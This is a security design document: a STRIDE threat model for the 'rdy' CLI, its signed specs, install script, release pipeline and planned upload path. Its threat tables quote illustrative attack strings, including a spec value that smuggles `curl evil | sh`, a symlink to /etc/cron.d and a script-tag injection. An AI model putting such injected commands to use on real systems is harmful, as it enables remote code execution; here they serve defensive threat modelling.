# 05 Threat model

Owner: security-reviewer. Status: draft for review by rust-architect and release-engineer. Date: 2026-10-27.

This document is a STRIDE threat model for `rdy` at M1 scope, with notes on what changes in M2 and later.
It covers four surfaces:

1. The `rdy` CLI running with elevated privileges inside a customer environment.
2. The spec supply chain: vendor signs, customer verifies.
3. The install script at getrdy.io/install and the release pipeline.
4. The opt-in upload path to app.getrdy.io (M2).

Every mitigation carries a milestone tag, `[M1]` or `[M2+]`, and a ticket id `SEC-nn`. The tickets are
listed at the end. Likelihood (L) and impact (I) are rated H, M or L for a design-partner deployment in M1.

## The one sentence a customer security reviewer must be able to believe

In M1, the worst a malicious or buggy signed spec can make `rdy` do is: run built-in read-only checks,
open TCP and TLS connections to the endpoints the spec lists (which are printed and recorded), and write
a report into one new output directory. It cannot run arbitrary commands, write anywhere else, change the
cluster, read Kubernetes Secrets or send data anywhere.

Every table below exists to keep that sentence true. Anything that would break it (custom exec checks,
file collection, upload, self-update) is M2 or later and gets its own review.

## Surface 1: the CLI as a privileged process

### Assets

- Host integrity. `rdy` may run as root.
- Cluster integrity. The kubeconfig may be cluster-admin.
- Cloud accounts (M3). Credentials may be broad.
- Secrets that root can read: `/etc/shadow`, SSH and TLS keys, kubeconfig tokens, proxy credentials in env.
- The report itself. It is a map of the environment: hostnames, versions, open ports, security agents.
- The customer's trust in the vendor and in Rdy.

### Trust boundaries

```text
 operator shell: root and/or cluster-admin kubeconfig and/or cloud creds
        |  argv, env, cwd, KUBECONFIG
        v
 +--------------------------------- rdy process ---------------------------------+
 |  spec bytes --[TB1: size cap, verify signature]--> parse --> engine --> checks |
 |                                                                 |             |
 |                                             [TB2: probe facade, policy, log]  |
 +-----------------------------------------------------------------|-------------+
        |                  |                    |                   |
   /proc, /sys, files   child processes     kube API server     endpoints listed
   (read only)          (no shell, fixed    (read-only verbs)   in the spec
                         PATH, timeout)                         (connect, TLS, HEAD)
        |
        |  [TB3: redaction before write]
        v
   output dir (new, 0700, files 0600) --[TB4: human carries it out, or upload M2]--> vendor
```

TB2, the probe facade, is the central control. Every side effect a check performs (exec a command, read
a file, open a socket, call the kube API) goes through one engine-owned interface. That interface
enforces the policies below and writes the action log. It is also what fixtures replay in tests, so
qa-engineer gets it for free. rust-architect owns its API in 02-engine-design.md.

### STRIDE

| # | Threat | Example attack | L | I | Mitigation | Ticket |
|---|---|---|---|---|---|---|
| S1 | Wrong cluster or identity | `KUBECONFIG` points at prod, operator thinks it is staging | M | M | `[M1]` Print context, server URL and authenticated user before the first kube call and in the report. Never switch context. `--context` is explicit. | SEC-24 |
| S2 | PATH hijack of child commands | Root runs `rdy` with a PATH containing a user-writable dir that holds a fake `uname` | M | H | `[M1]` Prefer `/proc` and `/sys` over commands. When spawning, resolve from a fixed PATH (`/usr/sbin:/usr/bin:/sbin:/bin`) if euid is 0. Scrub `LD_*` and `DYLD_*`. | SEC-18 |
| T1 | Write outside output dir | Attacker pre-creates `./rdy-out/report.html` as a symlink to `/etc/cron.d/x` in a shared dir | M | H | `[M1]` Create the output dir fresh (fail if it exists), write through a dir handle with no symlink following, temp file plus rename, modes 0700 and 0600. | SEC-19 |
| T2 | Spec value injection into commands | Spec sets `path: "/x; curl evil \| sh"` | L | H | `[M1]` No shell anywhere. Commands are argv arrays. Spec values are typed (u16 ports, validated hostnames, absolute normalized paths). | SEC-15, SEC-18 |
| T3 | Script injection into the HTML report | A probed endpoint returns `Server: <script>...`; a node is named with markup; a TLS-intercepting proxy cert has markup in its subject | M | M | `[M1]` askama autoescape, no `safe` filter on data, CSP `default-src 'none'`, no remote assets, golden test with payloads. | SEC-27 |
| T4 | Terminal escape injection | Same strings carry ANSI escapes that rewrite the operator's terminal | M | L | `[M1]` Strip control characters from untrusted strings before printing. | SEC-28 |
| R1 | "What did this thing do on my box?" | Security team cannot reconstruct actions after a run | M | M | `[M1]` Action log in the JSON result: every command, file read, endpoint and kube request with time and outcome. `[M2+]` `rdy run --plan` prints it before running. | SEC-17, SEC-40 |
| I1 | Secrets written into the report | `HTTPS_PROXY=http://svc:pa55@proxy:3128` is echoed as evidence; a bearer token appears in command output | H | H | `[M1]` Minimal redactor on every evidence string before write: URL userinfo, bearer tokens, AWS keys, PEM blocks, rdy tokens. Golden tests. | SEC-25, SEC-26 |
| I2 | Secrets in logs | `RUST_LOG=trace` makes a dependency log an `Authorization` header | M | H | `[M1]` Default filter caps hyper, h2, rustls, kube at `info`; a redacting layer on log output; test with secret-laden env at trace. | SEC-29 |
| I3 | Report readable by other users | Report lands in `/tmp` world-readable | M | M | `[M1]` 0700 dir, 0600 files, umask independent. | SEC-19 |
| I4 | Kubernetes Secret contents read | A check lists `secrets` to count them and the response carries data | L | H | `[M1]` Request allowlist forbids `secrets` reads. "Can I read secrets" is answered with SelfSubjectAccessReview. ConfigMaps listed metadata-only. | SEC-23 |
| I5 | Phone home | Telemetry, update check or DNS lookup to getrdy.io | L | H | `[M1]` None exists. Integration test in a network namespace, and a contact-set test. | SEC-22 |
| I6 | Internal reconnaissance via spec | Spec lists 500 internal hosts or `169.254.169.254` | M | M | `[M1]` Connect only to spec-listed endpoints, cap the count, refuse link-local and metadata addresses, never record response bodies. | SEC-21 |
| D1 | Production impact | Bandwidth sample saturates a link; huge command output exhausts memory | M | M | `[M1]` Every check has a timeout. Bandwidth sample capped in bytes and seconds. Child output capped at 1 MiB. | SEC-18, SEC-21 |
| D2 | Partial or corrupt report | Crash mid-write | L | L | `[M1]` Atomic rename; exit 70 with a hint. | SEC-19 |
| E1 | Cluster mutation | Bug or spec makes `rdy` create or delete objects with cluster-admin | L | H | `[M1]` Kube request allowlist: GET, LIST; POST only for SelfSubject*Review and `dryRun=All`. Mock API server test records every request. | SEC-23 |
| E2 | setuid abuse | An admin installs `rdy` setuid root; local users pass `--output /etc/...` | L | H | `[M1]` Exit 70 if real and effective uid differ. install.sh never sets setuid. | SEC-20, SEC-08 |
| E3 | Self-escalation | `rdy` calls `sudo` or prompts for a password | L | H | `[M1]` Never. `sudo`, `su`, `doas`, `pkexec` are refused by the exec policy. Checks that need root report `Skipped(NeedsRoot)`. | SEC-18 |
| E4 | Memory corruption from crafted input | Crafted spec, command output or HTTP response | L | H | `[M1]` `forbid(unsafe_code)` in our crates, dependency policy. `[M2+]` fuzz targets. | SEC-30, SEC-01, SEC-45 |
| E5 | kubeconfig exec plugin | The kube client runs an `exec` credential command named in a kubeconfig | L | H | `[M1]` Only the operator's own kubeconfig is loaded (default path, `KUBECONFIG`, or `--kubeconfig`). Never from a spec or from cwd. Documented. | SEC-24 |

### Residual risks

- Root is root. An operator who runs `rdy` as root trusts our code and our dependencies with the host.
  We shrink that with read-only behaviour, a small dependency set and an action log. We cannot remove it.
- kubeconfig exec plugins run whatever the kubeconfig says. That is the operator's own configuration.
- A vendor-signed spec can still probe internal endpoints it lists. The results stay local unless the
  customer sends them. Reviewers can read the endpoint list in the spec and the action log.
- Reports are customer-attested. A customer can edit a report before sending it. Results are evidence,
  not proof. The portal will label them as customer-reported.

## Surface 2: the spec supply chain

### Assets

- The vendor's ed25519 private key.
- The customer's set of trusted vendor public keys.
- Spec integrity: thresholds, endpoints, check selection.
- The customer's decision to run a spec at all.

### Trust boundaries

```text
 vendor laptop or CI                  transport (untrusted)            customer host
 +----------------------+   spec + signature    email, share link,   +-----------------------+
 | rdy spec sign        | --------------------> file share, USB ---> | rdy verify / rdy run  |
 | key file 0600        |         TB5                                 | trusted keys    TB6   |
 +----------------------+                                            +-----------------------+
           \                                                                  ^
            \---- key fingerprint, out of band: vendor docs site, contract, SE -----/
```

The key that verifies a spec must never arrive in the same artifact as the spec. In M1 the customer pins
vendor keys locally: a `--trusted-key <file>` flag, or files in `~/.config/rdy/trusted-keys/` and
`/etc/rdy/trusted-keys/`. Whether this becomes an `rdy trust` subcommand is cli-ux's call.

### Requirements for the signing format (input to 01-spec-format.md)

- The signature covers the exact bytes of the spec file. No re-serialization, no YAML canonicalization.
- The signed message is prefixed with a fixed context string, for example `rdy-spec-v1\0`, so a spec
  signature can never be replayed as a signature over anything else.
- One algorithm: Ed25519. No algorithm field the verifier obeys. Verify with `verify_strict`.
- The signature record carries a key id (fingerprint of the public key), not the key.
- The result JSON records the spec SHA-256, the key fingerprint and the signature status
  (`verified`, `unsigned-allowed`). The verified spec is copied into the output dir.
- `[M2+]` A `serial` and optional `expires` inside the signed bytes, for rollback and stale-spec warnings.

### STRIDE

| # | Threat | Example attack | L | I | Mitigation | Ticket |
|---|---|---|---|---|---|---|
| S1 | Impersonated vendor | Attacker signs a spec with their own key and emails it as "acme-platform" | M | M | `[M1]` Unknown key means refuse. Output shows signer fingerprint and the local label of the pinned key, never a name taken from the spec. | SEC-13 |
| S2 | Self-certifying spec | Envelope includes a public key and the verifier uses it | M | H | `[M1]` Invariant: keys come only from the local trust store or `--trusted-key`. Test with an envelope that carries a key. | SEC-13 |
| T1 | Tampered in transit | Threshold `min: 32Gi` edited to `min: 1Gi` | M | M | `[M1]` Verify signature over raw bytes before parsing. | SEC-12 |
| T2 | Signature stripping plus social engineering | "Just add `--allow-unsigned`, our signing is broken today" | M | M | `[M1]` Flag only on argv (no env, no config file). Loud banner. `UNSIGNED SPEC` watermark in HTML and JSON. TTY confirmation, default no. | SEC-14 |
| T3 | Parser differential | Duplicate keys or a second YAML document make the verified bytes mean something else | L | H | `[M1]` Single document only, duplicate keys rejected, unknown fields rejected. | SEC-15 |
| T4 | Rollback | Replay an older signed spec with weaker thresholds | L | L | `[M1]` Spec digest recorded in result. `[M2+]` serial and expiry. | SEC-12, SEC-46 |
| R1 | Dispute over which spec ran | "We never sent that spec" | L | M | `[M1]` Result records spec digest and key fingerprint; signed spec kept in output dir. | SEC-12 |
| I1 | Vendor private key leak | Key committed to a repo or printed in CI logs | M | H | `[M1]` keygen writes 0600 with exclusive create; `rdy spec sign` refuses group or world readable keys; secret is never printed; zeroized in memory. `[M2+]` rotation and revocation. | SEC-16, SEC-46 |
| D1 | Parser exhaustion | Billion-laughs aliases, 10,000-deep nesting, 2 GB file | M | L | `[M1]` 1 MiB cap before verification; anchors and aliases rejected; depth limit 64. | SEC-15 |
| D2 | Regex blowup | Custom redaction pattern in spec (M2) | L | L | `[M2+]` `regex` crate (linear time) with size limits. | SEC-44 |
| E1 | Capability creep through spec | Unknown check id, exec check, file collection glob | M | H | `[M1]` Only built-in check ids; unknown id is an error. No exec checks. `[M2+]` collection behind a path policy; exec behind `--allow-exec`. | SEC-15, SEC-43, SEC-53 |
| E2 | Signature malleability or weak keys | Small-order public key accepted | L | M | `[M1]` `ed25519-dalek` `verify_strict`; test vectors for weak keys. | SEC-12 |

### Residual risks

- Key distribution is manual in M1. A customer who pins the wrong key trusts the wrong vendor. Docs tell
  vendors to publish the fingerprint on their own site.
- No revocation in M1. A leaked vendor key stays valid on customer machines until they remove it.
- From M2 the portal may sign on the vendor's behalf. A compromised portal could then sign a spec. The
  bounded blast radius above is what limits the damage, so it must stay true in M2.

## Surface 3: install script and release pipeline

### Assets

- The maintainer's GitHub account and the `getrdy-io` org.
- `release.yml` and its OIDC identity (the thing cosign keyless binds signatures to).
- The Cloudflare account that serves getrdy.io and the domain registrar account.
- crates.io ownership of every `rdy*` name.
- Release artifacts: archives, checksum file, Sigstore bundle, SBOM.

### Trust boundaries

```text
 maintainer --push tag v*--> GitHub (rulesets, 2FA) --> release.yml (SHA-pinned actions)
                                                          | cargo build --locked (cargo-dist)
                                                          | cosign sign-blob (keyless, OIDC)
                                                          v
                         GitHub Release (immutable): archives, SHA256SUMS, SHA256SUMS.sigstore.json, SBOM
                                                          ^
 customer: curl --proto '=https' --tlsv1.2 -sSf https://getrdy.io/install | sh
              |                                           |
          TB7: script from Cloudflare Pages          TB8: artifacts from GitHub
```

The script and the binaries come from different origins on purpose. A compromise of one origin alone is
caught: a swapped binary fails the signature check, and a reviewer can diff the served script against
the signed copy attached to the release. A compromise of getrdy.io still lets an attacker serve a script
that skips verification. That is the curl-pipe-sh residual risk, and the verify-first path in the docs
exists for reviewers who will not accept it.

### install.sh behaviour (input to 06-release-and-distribution.md)

- POSIX sh, `set -eu`, shellcheck clean. All logic in `main()`, called on the last line, so a truncated
  download runs nothing.
- Refuses to run when `id -u` is 0 unless `--allow-root` is given (`sh -s -- --allow-root`).
- Installs to `$HOME/.local/bin` by default. Never calls sudo. Never edits shell rc files; prints a PATH
  hint instead. Never sets setuid.
- Detects OS and arch against an allowlist; unknown means stop.
- Downloads into `mktemp -d` with a cleanup trap, using `curl --proto '=https' --tlsv1.2 -fsSL`.
- Verifies `SHA256SUMS` with `cosign verify-blob` pinned to the release workflow identity, then verifies
  the archive hash against it, then extracts. Nothing is made executable before both pass.
- If cosign is not installed, it stops and prints the two-line manual verification path. The escape hatch
  is `RDY_INSECURE_SKIP_SIGNATURE=1`, which still checks the hash and prints a loud warning. See the ADR
  note at the end.

Verification command the docs and the script both use:

```sh
cosign verify-blob \
  --bundle SHA256SUMS.sigstore.json \
  --certificate-oidc-issuer https://token.actions.githubusercontent.com \
  --certificate-identity-regexp '^https://github\.com/getrdy-io/rdy/\.github/workflows/release\.yml@refs/tags/v[0-9]+\.[0-9]+\.[0-9]+$' \
  SHA256SUMS
sha256sum --ignore-missing -c SHA256SUMS
```

### STRIDE

| # | Threat | Example attack | L | I | Mitigation | Ticket |
|---|---|---|---|---|---|---|
| S1 | Typosquat crate or domain | `cargo install rdy-cli` pulls an attacker crate; a lookalike domain | M | H | `[M1]` Reserve `rdy-cli` and the planned names on crates.io. Docs show one install URL. | SEC-11 |
| S2 | Signature from the wrong identity | A fork's workflow signs a malicious build with valid Sigstore certs | M | H | `[M1]` Verification pins issuer and exact workflow identity on tag refs. Release workflow self-verifies. | SEC-06, SEC-09 |
| T1 | getrdy.io serves a malicious script | Cloudflare or registrar account takeover, DNS hijack | L | H | `[M1]` Hardware-key MFA on registrar, Cloudflare, GitHub; registrar lock; DNSSEC; CAA; HSTS. Signed copy of install.sh in each release. Verify-first docs. | SEC-05, SEC-31 |
| T2 | Truncated script runs | Connection drops mid-download | L | M | `[M1]` `main()` guard. | SEC-08 |
| T3 | Release asset replaced after publish | Stolen token re-uploads an archive | L | H | `[M1]` GitHub immutable releases on; signature check fails on any swap. | SEC-04, SEC-06 |
| T4 | Compromised third-party Action | A mutable action tag is retargeted, as with `tj-actions/changed-files` in March 2025 | M | H | `[M1]` Pin every action to a full commit SHA. zizmor in CI. Default `permissions: contents: read`; `id-token: write` only in the signing job. | SEC-03 |
| T5 | Malicious dependency | New crate version with a `build.rs` payload | M | H | `[M1]` Cargo.lock committed, `--locked` everywhere, crates.io only, new-dependency review, daily advisories. | SEC-01, SEC-02 |
| T6 | Fork PR reaches secrets | `pull_request_target` workflow checks out untrusted code | L | H | `[M1]` No `pull_request_target`. No secrets in PR workflows. | SEC-03 |
| R1 | Unattributable release | "Who published 0.3.1?" | L | M | `[M1]` Rekor entry per signature; GitHub audit log; release only from tags. | SEC-06 |
| I1 | Long-lived secrets leak from CI | crates.io token printed in a log | L | M | `[M1]` Keyless signing (no signing key to leak). crates.io trusted publishing. | SEC-06, SEC-11 |
| D1 | Install path unavailable | getrdy.io down, GitHub rate limit | M | L | `[M1]` Documented direct download and air-gap path. | SEC-31 |
| E1 | Installer as root | Script run with sudo writes into system paths | M | M | `[M1]` Refuses root unless `--allow-root`; user-local install; never sudo. | SEC-08 |
| E2 | Maintainer account takeover | Attacker pushes a tag and gets a legit-looking signed release | L | H | `[M1]` Hardware-key 2FA, tag ruleset limits who creates `v*`, release job runs in a GitHub environment that needs a manual approval click. | SEC-04 |

### Residual risks

- curl-pipe-sh trusts getrdy.io for the script itself. Mitigated, not removed.
- One maintainer. Two-person review of releases is not possible yet. A stolen, unlocked founder session
  can ship a release. Hardware keys and the manual approval step are the controls.
- cosign is rarely preinstalled. Fail-closed install hurts first-run UX. Tracked as an ADR.
- No Windows Authenticode or macOS notarization in M1. Windows SmartScreen and some EDR tools will flag
  the binary. `[M2+]` SEC-50.
- cargo-dist maintenance pace should be checked by release-engineer before we depend on it for signing.

## Surface 4: the opt-in upload path (M2)

M1 has no upload code. The M1 invariant is simply that no code path sends result data anywhere.
This section fixes the requirements now so M2 does not have to retrofit them.

### Assets

- The share-link token.
- Result JSON and bundles: customer environment data.
- The vendor's view in the portal (integrity of what SEs see).

### Trust boundaries

```text
 customer host                          customer egress                 Rdy Cloud (private repo)
 +---------------------------+          proxy, maybe TLS inspection     +-------------------------+
 | output dir (redacted)     |                                          | app.getrdy.io API        |
 |  result.json, bundle      | --rdy upload, explicit--> TB10 --------> | token -> one share link  |
 |  upload-receipt.json      |  TB9: consent prompt, file list, bytes   | write-only scope         |
 +---------------------------+                                          +-------------------------+
```

### STRIDE

| # | Threat | Example attack | L | I | Mitigation | Ticket |
|---|---|---|---|---|---|---|
| S1 | Fake portal | Pasted command includes `--server https://app.getrdy-io.com` | M | H | `[M2+]` Default server fixed. A non-default server is shown in the consent prompt and recorded in the receipt. TLS via the platform verifier. | SEC-41 |
| S2 | Stolen token posts fake results | Attacker poisons the vendor's dashboard | M | M | `[M2+]` Token is write-only, scoped to one share link, expires, rate limited, revocable. Portal labels results customer-reported. | SEC-42 |
| T1 | Payload altered in transit | Intercepting proxy edits the body | L | M | `[M2+]` TLS; SHA-256 of each file in a header; server verifies and echoes it in the receipt. | SEC-41 |
| T2 | Server drives client behaviour | Response says "now collect /etc/shadow" or "fetch this spec" | L | H | `[M2+]` Client parses only a receipt id and a URL to print. Nothing else in the response is acted on. | SEC-41 |
| R1 | Customer cannot prove what left | "Your tool sent our hostnames" | M | M | `[M2+]` Upload sends the exact on-disk bytes of listed files, no extra fields. `upload-receipt.json` records digests, sizes, destination, time, server id. | SEC-41 |
| I1 | Upload without consent | Default behaviour sends data | L | H | `[M1]` No upload code exists. `[M2+]` Upload only with `--upload` or an interactive yes (default no). Non-TTY never prompts and never uploads without the flag. | SEC-22, SEC-41 |
| I2 | Unredacted data leaves | Upload reads a file outside the output dir | M | H | `[M2+]` Upload reads only files named in the output dir manifest, which were redacted before write. | SEC-41, SEC-44 |
| I3 | Token leaks | Token in argv shows up in `ps`, shell history, CI logs; token in URL lands in proxy logs | H | M | `[M2+]` Token from `RDY_TOKEN`, `--token-file` or a prompt. Sent only in the `Authorization` header. Recognizable prefix (`rdy_st_`) so the redactor and secret scanners catch it. | SEC-41, SEC-42, SEC-25 |
| I4 | Cross-tenant leak in portal | One vendor sees another's results | L | H | Out of scope here. rdy-cloud needs its own threat model before M2 beta. | none |
| D1 | Oversized upload or retry storm | 5 GB bundle, infinite retries | L | L | `[M2+]` Client size cap per tier; bounded retries with backoff. | SEC-41 |
| E1 | Token grants more than upload | Token reads other results or signs in | L | H | `[M2+]` Write-only scope enforced server side; separate from any user session. | SEC-42 |

### Residual risks

- The customer's TLS-inspecting proxy sees uploaded content. That is the customer's own control point.
  We do not pin certificates, because pinning breaks the corporate proxies our users sit behind.
- Results are customer-attested (see surface 1).

## Security invariants

These are the statements the code must keep true. Each has a test. A PR that breaks one fails CI.

| Id | Invariant | Test | Milestone |
|---|---|---|---|
| INV-01 | No spec byte reaches the YAML parser before the signature verifies, unless `--allow-unsigned` is on argv. | Unit test with a parser spy; tampered spec never parsed. | M1 |
| INV-02 | A spec larger than 1 MiB is rejected before verification. | Unit test with a 1 MiB + 1 byte file. | M1 |
| INV-03 | Verification keys come only from `--trusted-key` or the trust store dirs. A key inside the spec or envelope is ignored. | Envelope carrying its own key fails with "unknown key". | M1 |
| INV-04 | `--allow-unsigned` cannot be set by env var or config file, and an unsigned run marks HTML and JSON as unsigned. | Integration test checks env/config are ignored and golden output contains the watermark. | M1 |
| INV-05 | Unknown check ids, unknown fields, duplicate keys, anchors, aliases and multi-document streams are errors (exit 64). | Proptest and fixture cases. | M1 |
| INV-06 | Every check side effect goes through the probe facade and appears in the action log. | Test that a run's log lists every fixture command, file and endpoint used; lint forbids `std::process::Command` and `std::net` outside the facade crate module. | M1 |
| INV-07 | No shell is ever spawned, and `sudo`, `su`, `doas`, `pkexec` are never executed. | Facade unit test; grep test for `sh -c` and `cmd /C`. | M1 |
| INV-08 | All files are written inside one newly created output dir, with 0700 and 0600 on Unix. Symlinks are never followed on write. | Pre-planted symlink test; mode test. | M1 |
| INV-09 | `rdy` exits 70 when real and effective uid differ. | Unit test on the check function. | M1 |
| INV-10 | The only network peers are endpoints listed in the verified spec and the selected kube API server. | Run under `unshare -rn` with a no-net spec (passes); contact-set test with local listeners. | M1 |
| INV-11 | Link-local and cloud metadata addresses are refused as net check targets. | Unit test for 169.254.0.0/16, fe80::/10, fd00:ec2::254. | M1 |
| INV-12 | Net checks never store response bodies. | Fixture server returns a body with a canary; canary absent from output. | M1 |
| INV-13 | Kube requests are GET or LIST, or POST to SelfSubjectAccessReview, SelfSubjectRulesReview, or any POST with `dryRun=All`. Nothing touches `secrets`. | Mock API server records requests; test asserts the allowlist. | M1 |
| INV-14 | Every string written to a report or log passes the redactor first. | Golden tests over the M1 corpus; canary secrets in env, kubeconfig and command output never appear in output or logs. | M1 |
| INV-15 | The HTML report loads no remote resource and runs no script built from data. | Golden test with XSS payloads; CSP meta present; grep for `http` in `src`/`href` attributes other than plain links. | M1 |
| INV-16 | Untrusted strings printed to the terminal contain no control characters. | Unit test with ANSI sequences. | M1 |
| INV-17 | Our crates contain no `unsafe`. | `#![forbid(unsafe_code)]` check in CI. | M1 |
| INV-18 | install.sh refuses root without `--allow-root`, refuses a bad hash, refuses a bad or missing signature (unless the insecure env var is set), and executes nothing if truncated. | Shell test suite. | M1 |
| INV-19 | No upload without `--upload` or an interactive yes; non-TTY never uploads without the flag. | Integration test with a fake server counting requests. | M2 |
| INV-20 | Upload sends exactly the bytes on disk and writes a receipt with matching digests. | Fake server compares digests. | M2 |

## What a Fortune 100 security reviewer will ask

| Question | Answer | When true |
|---|---|---|
| What does it do on my host? | Reads `/proc`, `/sys` and a short list of files, runs a short list of commands without a shell, connects to endpoints in the spec. The JSON result has the full action log. | M1 (`--plan` preview in M2) |
| Does it need root? | No. It runs as any user and reports what it could not check. It never asks for sudo. | M1 |
| Does it phone home? | No. No telemetry, no update check. Upload is a separate explicit command. Tested in a network namespace. | M1 |
| What can a malicious spec do? | The bounded sentence at the top of this document. | M1 |
| Can a spec run arbitrary commands? | No. Custom script checks are not in M1; when they come they are off unless `--allow-exec`. | M1 |
| What does it do with cluster-admin? | Read-only verbs plus access reviews and dry-run. It never reads Secrets. We ship a read-only ClusterRole so you do not need cluster-admin at all. | M1 |
| How do I verify the binary? | cosign keyless signature bound to our release workflow, SHA-256 sums, SBOM, and `cargo audit bin rdy` reads the dependency list embedded by cargo-auditable. | M1 |
| How do I know the spec came from my vendor? | You pin the vendor's public key from their own site. Unsigned or unknown-key specs are refused. | M1 |
| What is in the report and who can read it? | Field list on the docs security page. Files are 0600 in a 0700 dir. Secrets are redacted before write. | M1 |
| What leaves the machine? | Nothing by default. Upload shows files, sizes and destination first, sends the exact bytes, and writes a receipt. The upload client is open source. | M2 |
| Is it memory safe? | Rust, no `unsafe` in our crates, dependencies reviewed with cargo-deny and audited daily. | M1 |
| Reproducible builds? | A goal. Deviations documented. Verification job in M3. | M3 |
| FIPS? | Not in M1. The rustls crypto provider choice decides the path (ADR). | Later |
| Third-party audit? | Planned before the Enterprise tier, budget $15k to $25k. Until then this threat model is public. | M5 |
| How do I report a vulnerability? | SECURITY.md: GitHub private reporting or security@getrdy.io, 3 business day acknowledgement, 90-day disclosure. | M1 |
| Is the portal SOC 2? | Not yet. Roadmap on the Trust page. The CLI works fully without the portal. | Later |

## SECURITY.md and disclosure process

`SECURITY.md` at the repo root is written. The process behind it:

1. Channels: GitHub private vulnerability reporting on `getrdy-io/rdy` (preferred), or
   security@getrdy.io. PGP key to be published. `/.well-known/security.txt` on getrdy.io points to both.
2. Scope: the `rdy` binary, the public crates, install.sh, release artifacts and the release pipeline.
   app.getrdy.io joins scope when the portal launches.
3. Acknowledge within 3 business days. Triage and severity (CVSS 4.0) within 7 days.
4. Fix in a private fork via a GitHub security advisory. Target: critical 14 days, high 30, others 90.
5. Coordinated disclosure at fix release or 90 days, whichever is first. Extension by mutual agreement.
6. Publish a GHSA, request a CVE through GitHub, add a RUSTSEC entry for affected public crates, note it
   in CHANGELOG, credit the reporter unless they decline.
7. Supported versions: the latest minor release only while pre-1.0.
8. Safe harbor for good-faith research. No bug bounty yet.

Realism note: one part-time maintainer. The timelines above are what one person can keep. Do not shorten
them in marketing copy.

## Dependency policy

Rules:

- crates.io only. No git or path dependencies outside the workspace.
- `Cargo.lock` committed. CI and release builds use `--locked`.
- Every new direct dependency needs security-reviewer approval. The PR states: purpose, why std is not
  enough, maintainers, downloads, `unsafe` use, `build.rs` or proc-macro, license.
- Prefer fewer crates. Turn off default features and enable what we use.
- An advisory ignore must name a ticket and an expiry date no more than 90 days out.

Audit cadence:

| When | What |
|---|---|
| Every PR | `cargo deny check` (advisories, bans, licenses, sources). |
| Daily | `audit.yml` runs `cargo deny check advisories` and `cargo audit`; opens or updates a `security` issue. |
| Weekly | Dependabot PRs for cargo and GitHub Actions (SHA pins), grouped. |
| Every release | `cargo audit bin` on the built binaries; CycloneDX SBOM attached; dependency count in release notes. |
| Quarterly | Review duplicates, unmaintained crates, crates with build scripts, ownership changes. |

`deny.toml` starting point (release-engineer confirms key names against the pinned cargo-deny version):

```toml
[graph]
targets = [
  "x86_64-unknown-linux-musl", "aarch64-unknown-linux-musl",
  "x86_64-apple-darwin", "aarch64-apple-darwin", "x86_64-pc-windows-msvc",
]
all-features = true

[advisories]
version = 2
yanked = "deny"
unmaintained = "all"
unsound = "all"
ignore = [
  # { id = "RUSTSEC-YYYY-NNNN", reason = "SEC-nn, expires YYYY-MM-DD" },
]

[licenses]
version = 2
confidence-threshold = 0.93
allow = [
  "Apache-2.0", "Apache-2.0 WITH LLVM-exception", "MIT", "BSD-2-Clause", "BSD-3-Clause",
  "ISC", "Zlib", "Unicode-3.0", "CC0-1.0", "BSL-1.0", "CDLA-Permissive-2.0",
]
# MPL-2.0 and OpenSSL (for example aws-lc-sys) only as reviewed per-crate exceptions.
exceptions = []

[bans]
multiple-versions = "warn"
wildcards = "deny"
deny = [
  { crate = "openssl", reason = "rustls only, CLAUDE.md rule 5" },
  { crate = "openssl-sys", reason = "rustls only" },
  { crate = "native-tls", reason = "rustls only" },
  { crate = "hyper-tls", reason = "rustls only" },
  { crate = "tokio-native-tls", reason = "rustls only" },
  { crate = "atty", reason = "unmaintained, RUSTSEC-2021-0145; use std::io::IsTerminal" },
  { crate = "serde_yml", reason = "RUSTSEC-2025-0068, unsound, no fix" },
  { crate = "libyml", reason = "RUSTSEC-2025-0067" },
  { crate = "serde_yaml", reason = "archived by its author; parser choice goes through an ADR" },
]

[sources]
unknown-registry = "deny"
unknown-git = "deny"
allow-registry = ["https://github.com/rust-lang/crates.io-index"]
```

Denied licenses, never as exceptions: GPL, LGPL (a static musl binary makes relinking impractical),
AGPL, SSPL, BUSL, Commons Clause, and anything unlicensed or unknown.

## Redaction corpus requirements (handed to 04-bundle-and-redaction.md)

The corpus is the test suite for "redaction before write". It is owned by security-reviewer and
qa-engineer. M1 needs a subset for reports and logs. M2 needs the full set for bundles.

Layout and format:

- `tests/fixtures/redaction/<category>/<case>.in` with `<case>.expected` next to it, plus a
  `<case>.toml` naming the category, the redactor rule ids that must fire, and whether the case is a
  positive (must redact) or negative (must not touch).
- Replacement format is stable and typed, for example `[REDACTED:aws_access_key_id]`, so golden files
  are readable and reviewers can see which rule fired.
- Every value is synthetic. Use vendor-documented example values where they exist (for example
  `AKIAIOSFODNN7EXAMPLE`). For formats that GitHub push protection blocks, build the value at test time
  from parts so the repo never holds a scannable token.

Categories, M1 subset first:

| Category | M1 | Examples of cases |
|---|---|---|
| URL userinfo | yes | proxy env vars, `git` remotes, JDBC and Postgres URLs, percent-encoded passwords |
| Bearer and basic auth | yes | `Authorization:` headers, curl `-H` lines, `Basic` base64 |
| AWS keys | yes | access key ids, secret keys after `=` or `:`, session tokens |
| PEM private keys | yes | RSA, EC, OpenSSH, PKCS#8, encrypted, CRLF line endings |
| Kubeconfig credentials | yes | `token:`, `client-key-data:`, `password:`, exec env values |
| rdy tokens | yes | `rdy_st_` prefix in argv, env and logs |
| Generic secrets by key name | yes | `password=`, `secret:`, `api_key` in env, YAML, JSON, INI |
| Emails | M2 | in logs and config |
| JWTs, GitHub, GitLab, Slack, Stripe tokens | M2 | prefixes and shapes |
| GCP and Azure credentials | M2 | service account JSON, connection strings |
| Custom spec patterns | M2 | vendor-supplied regex |

Hostile cases every category needs:

- The secret split across a streaming chunk boundary. Redaction runs on streams in M2, so the corpus
  must test at every offset within the longest pattern length.
- Encodings: JSON-escaped, URL-encoded, inside quotes, YAML block scalars, multi-line values.
- Context: journald lines, Kubernetes events, env dumps, command output with ANSI codes.
- Near misses that must not be redacted (negatives): git SHAs, UUIDs, base64 image data, version strings.
- Unicode lookalikes and zero-width characters around key names.

Quality bars:

- 100 percent of positive cases redacted. A single miss fails CI.
- False positives tracked per category as a number in the test output, not gated in M1.
- Every bug report about a missed secret adds a case before the fix lands.
- Size: at least 60 cases in M1, at least 300 by the end of M2.

## Plan corrections found

- `docs/plan/rdy-plan.md`, Website plan, Stack: says the install endpoint is `get.<domain>`. CLAUDE.md
  and the Name table say `getrdy.io/install`. Fix: one URL, `https://getrdy.io/install`; drop `get.`
  or make it a redirect only.
- `docs/plan/rdy-plan.md`, Release engineering: "Binaries and specs signed with Sigstore (cosign)".
  CLAUDE.md rule 3 says specs are signed with the vendor's ed25519 key. Fix: binaries with cosign
  keyless; specs with the vendor's ed25519 key.
